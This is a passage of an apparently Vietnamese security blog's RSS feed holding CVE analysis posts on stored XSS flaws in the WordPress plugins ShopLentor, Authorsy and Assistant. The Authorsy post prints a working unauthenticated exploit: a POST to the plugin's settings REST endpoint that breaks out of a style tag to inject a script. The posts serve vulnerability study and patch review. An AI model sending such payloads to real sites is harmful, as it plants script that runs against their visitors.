2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;CVE-2025-58990&lt;/strong&gt; trong plugin &lt;strong&gt;ShopLentor &amp;lt;= 3.2.0&lt;/strong&gt; cho phép &lt;strong&gt;contributor&lt;/strong&gt; chèn CSS độc hại dẫn đến Stored XSS khi admin/author preview hoặc xem post. Bản vá &lt;strong&gt;3.2.1&lt;/strong&gt; bổ sung kiểm tra quyền và sanitize CSS, ngăn chặn khai thác.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Luôn kết hợp &lt;strong&gt;kiểm tra quyền&lt;/strong&gt; và &lt;strong&gt;sanitize&lt;/strong&gt; dữ liệu khi xử lý input từ người dùng.&lt;/li&gt;&#xA;&lt;li&gt;Các role thấp (như &lt;strong&gt;contributor&lt;/strong&gt;) vẫn có thể trở thành điểm tấn công nếu API không bảo vệ đúng cách.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Stored XSS&lt;/strong&gt; trong WordPress thường xuất hiện khi dữ liệu được lưu DB/file =&amp;gt; render inline mà không lọc.&lt;/li&gt;&#xA;&lt;li&gt;Việc cập nhật plugin kịp thời là biện pháp phòng thủ đơn giản nhưng hiệu quả nhất.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/cross-site-scripting/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Cross-site scripting (XSS) cheat sheet&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/ShopLentor/vulnerability/wordpress-ShopLentor-plugin-1-0-5-cross-site-scripting-xss-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress ShopLentor Plugin &amp;lt;= 3.2.0 is vulnerable to Cross Site Scripting (XSS) &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-27006 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-04-cve-2025-27006/</link>
      <pubDate>Sat, 04 Oct 2025 19:37:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-04-cve-2025-27006/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-04-cve-2025-27006/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;Lỗ hổng xảy ra trên plugin &lt;strong&gt;Authorsy&lt;/strong&gt; của WordPress trước phiên bản &lt;strong&gt;1.0.6&lt;/strong&gt;. Điều này có thể cho phép kẻ tấn công chèn mã độc (ví dụ: script chuyển hướng, quảng cáo, hoặc các payload HTML khác) vào website, và những mã đó sẽ được thực thi khi khách truy cập mở trang.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-27006&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-27006&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/authorsy/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Authorsy Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Cross Site Scripting&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.0.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (6.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;OWASP Top 10&lt;/strong&gt;: A1: Broken Access Control&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Subscriber&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;Trong mô tả yêu cầu đặc quyền &lt;strong&gt;Subscriber&lt;/strong&gt; nhưng thực ra có thể khai thác &lt;strong&gt;Unauthenticated&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Authorsy&lt;/strong&gt;: v1.0.5(vul) và v1.0.6(fix)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;diff tool&lt;/strong&gt;: &lt;strong&gt;meld&lt;/strong&gt; hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Ứng dụng có chức năng tùy chỉnh CSS, lưu dữ liệu trong &lt;code&gt;wp_options&lt;/code&gt; và chèn trực tiếp vào &lt;code&gt;&amp;lt;style&amp;gt;&lt;/code&gt; trên trang. Tuy nhiên, người dùng có thể tương tác với API để chỉnh sửa dữ liệu CSS mà &lt;strong&gt;không bị kiểm soát quyền&lt;/strong&gt;, dẫn đến nguy cơ &lt;strong&gt;Broken Access Control&lt;/strong&gt; và có thể &lt;strong&gt;XSS&lt;/strong&gt; nếu chèn payload độc hại.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Dùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá.&#xA;Có sự khác biệt rõ ở 2 file &lt;strong&gt;core/settings/api-settings.php&lt;/strong&gt; và &lt;strong&gt;core/enqueue-inline/enqueue-inline.php&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-04-cve-2025-27006/diff1.png&#34;&#xA;    alt=&#34;Diff showing changes in enqueue-inline.php to sanitize custom CSS&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Diff showing changes in enqueue-inline.php to sanitize custom CSS&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-04-cve-2025-27006/diff2.png&#34;&#xA;    alt=&#34;Diff showing REST API permission callback changes in api-settings.php&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Diff showing REST API permission callback changes in api-settings.php&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;detect-xss&#34;&gt;&lt;span&gt;Detect XSS&lt;/span&gt;&#xA;  &lt;a href=&#34;#detect-xss&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Gửi &lt;strong&gt;POST&lt;/strong&gt; request đến &lt;code&gt;/wp-json/authorsy/v1/settings&lt;/code&gt; với XSS payload:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/authorsy/v1/settings HTTP/1.1&#xA;Host: localhost&#xA;&#xA;Content-Type: application/json&#xA;&#xA;{&#xA;&amp;#34;primary_color&amp;#34;:&amp;#34;&amp;lt;/style&amp;gt;&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;&amp;lt;style&amp;gt;&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ta đóng thẻ &lt;code&gt;&amp;lt;style&amp;gt;&lt;/code&gt; (CSS trong head) và inject thêm thẻ &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; chứa XSS payload.&lt;/p&gt;&#xA;&lt;p&gt;Truy cập một trang bất kỳ.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-04-cve-2025-27006/xss.png&#34;&#xA;    alt=&#34;XSS payload injected via custom CSS&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;XSS payload injected via custom CSS&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;👉 XSS thành công, &lt;strong&gt;inspect&lt;/strong&gt; để xem code được thay đổi như nào.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;style&amp;gt;&#xA;    :root { &#xA;        --ea-color-main: &amp;lt;/style&amp;gt;&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;&amp;lt;style&amp;gt;;  &#xA;    } &#xA;&amp;lt;/style&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;code&gt;CVE-2025-27006&lt;/code&gt; trong plugin &lt;strong&gt;Authorsy &amp;lt;= 1.0.5&lt;/strong&gt; là một ví dụ điển hình về &lt;strong&gt;Broken Access Control&lt;/strong&gt; kết hợp với &lt;strong&gt;XSS&lt;/strong&gt;. Nguyên nhân chính là:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;REST API&lt;/strong&gt; không kiểm soát quyền truy cập: bất kỳ user nào cũng có thể gọi &lt;code&gt;/wp-json/authorsy/v1/settings&lt;/code&gt; để thay đổi các option.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CSS&lt;/strong&gt; tùy chỉnh chưa được &lt;strong&gt;sanitize&lt;/strong&gt;: giá trị CSS được chèn trực tiếp vào &lt;code&gt;&amp;lt;style&amp;gt;&lt;/code&gt; trong &lt;code&gt;&amp;lt;head&amp;gt;&lt;/code&gt;, cho phép kẻ tấn công inject payload &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; thông qua CSS.&#xA;Nonce không được xử lý đúng: &lt;strong&gt;verify_nonce&lt;/strong&gt; chỉ trả về &lt;strong&gt;WP_Error&lt;/strong&gt; mà không ngăn code thực thi, khiến việc kiểm tra bảo mật gần như vô hiệu.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;REST API&lt;/strong&gt; cần kiểm soát quyền: luôn sử dụng &lt;code&gt;permission_callback&lt;/code&gt; hợp lý để ngăn &lt;strong&gt;Broken Access Control&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Sanitize dữ liệu người dùng trước khi render trong HTML/CSS/JS để phòng &lt;strong&gt;XSS&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/cross-site-scripting/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Cross-site scripting (XSS) cheat sheet&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/authorsy/vulnerability/wordpress-authorsy-plugin-1-0-5-cross-site-scripting-xss-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Authorsy Plugin &amp;lt;= 1.0.5 is vulnerable to Cross Site Scripting (XSS)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-53307 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-03-cve-2025-53307/</link>
      <pubDate>Fri, 03 Oct 2025 19:19:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-03-cve-2025-53307/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-03-cve-2025-53307/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;Lỗ hổng xảy ra trên plugin &lt;strong&gt;Assistant&lt;/strong&gt; của WordPress trước phiên bản &lt;strong&gt;3.6.2&lt;/strong&gt;. Điều này có thể cho phép kẻ tấn công chèn mã độc (ví dụ: script chuyển hướng, quảng cáo, hoặc các payload HTML khác) vào website, và những mã đó sẽ được thực thi khi khách truy cập mở trang.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-53307&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-53307&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/assistant/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Assistant Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Cross Site Scripting&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.5.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (7.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Assistant&lt;/strong&gt;:  v1.5.2(vul) và v1.5.3(fix)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;diff tool&lt;/strong&gt;: &lt;strong&gt;meld&lt;/strong&gt; hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Ứng dụng hiển thị trực tiếp nội dung hình ảnh do người dùng cung cấp thông qua URL &lt;strong&gt;mà không xác thực và kiểm tra đầy đủ MIME type&lt;/strong&gt;. Điều này dẫn đến việc kẻ tấn công có thể cung cấp một tập tin giả dạng hình ảnh và khi được trình duyệt xử lý, nó sẽ thực thi mã độc =&amp;gt; gây ra lỗ hổng XSS.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 